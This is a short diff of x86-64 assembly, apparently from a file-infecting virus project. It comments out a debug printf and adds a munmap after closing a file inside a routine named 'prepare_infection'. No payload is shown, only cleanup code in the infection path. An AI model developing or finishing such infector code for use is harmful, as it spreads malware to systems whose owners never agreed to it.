@@ -420,7 +420,7 @@ print_rax:
 		push	rdx
 
 		lea		rsi, [rel path]
-		call	printf
+		;call	printf here
 		lea		rdi, [rel buff]
 		mov		rcx, 512
 		xor		rax, rax
@@ -685,6 +685,10 @@ prepare_infection:
 	.close_file:
 		mov		rax, SYS_close
 		mov		rdi, r12
+		syscall
+		mov		rax, SYS_munmap
+		mov		rdi, r14
+		mov		rsi, [rel file_size]
 		syscall
 	.return:
 		POP_ALL
